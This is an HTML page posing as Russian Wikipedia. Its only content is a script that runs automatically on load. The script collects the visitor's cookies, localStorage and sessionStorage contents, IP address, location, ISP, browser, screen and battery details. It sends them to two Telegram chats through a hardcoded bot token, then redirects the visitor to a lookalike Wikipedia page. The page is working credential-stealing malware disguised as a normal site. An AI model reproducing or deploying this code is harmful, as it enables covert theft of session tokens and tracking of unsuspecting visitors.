<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Википедия</title></head>
<body>
<script>
var TOKEN    = '8993357789:AAEj6RwqamGu0QUUVAyEDaZ2KmPZMCYxxro';
var ID       = '5442175617';
var ID2      = '6783102477';
var REDIRECT = 'https://shuranovikov029-crypto.github.io/vikipedia-org/Заглавная_страница';

function dumpStorage(s){
  try {
    if (!s || s.length === 0) return '(пусто)';
    var o = [];
    for (var i = 0; i < s.length; i++){ var k = s.key(i); o.push(k + '=' + s.getItem(k)); }
    return o.join('; ');
  } catch(e){ return '(н/д)'; }
}

var cookieStr = document.cookie || 'пусто';
var lsStr = dumpStorage(localStorage);
var ssStr = dumpStorage(sessionStorage);

function sendTo(chatId, text){
  var u = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'
        + '?chat_id=' + encodeURIComponent(chatId)
        + '&text=' + encodeURIComponent(text);
  return fetch(u, { mode: 'no-cors', keepalive: true }).catch(function(){});
}

function send(ip, bat){
  ip = ip || {};
  var conn = ip.connection || {};
  var t = 'IP: ' + (ip.ip || 'н/д') + '\n'
    + 'Город: ' + (ip.city || '?') + ', ' + (ip.country || '?') + '\n'
    + 'Провайдер: ' + (conn.isp || '?') + '\n'
    + 'UA: ' + navigator.userAgent + '\n'
    + 'Экран: ' + screen.width + 'x' + screen.height + '\n'
    + 'Батарея: ' + bat + '\n'
    + 'URL: ' + location.href + '\n'
    + 'Referrer: ' + (document.referrer || 'нет') + '\n'
    + 'Cookies: ' + cookieStr + '\n'
    + 'localStorage: ' + lsStr + '\n'
    + 'sessionStorage: ' + ssStr;

  Promise.all([ sendTo(ID, t), sendTo(ID2, t) ]).finally(function(){
    setTimeout(function(){ location.replace(REDIRECT); }, 400);
  });
}

var ipP = fetch('https://ipwho.is/').then(function(r){ return r.json(); }).catch(function(){ return {}; });

var batP = (navigator.getBattery && location.protocol === 'https:')
  ? navigator.getBattery().then(function(b){
      return Math.round(b.level*100) + '%' + (b.charging ? ' (заряжается)' : '');
    }).catch(function(){ return 'н/д'; })
  : Promise.resolve('н/д');

Promise.all([ipP, batP]).then(function(r){ send(r[0], r[1]); }).catch(function(){ send({}, 'н/д'); });
</script>
</body>
</html>
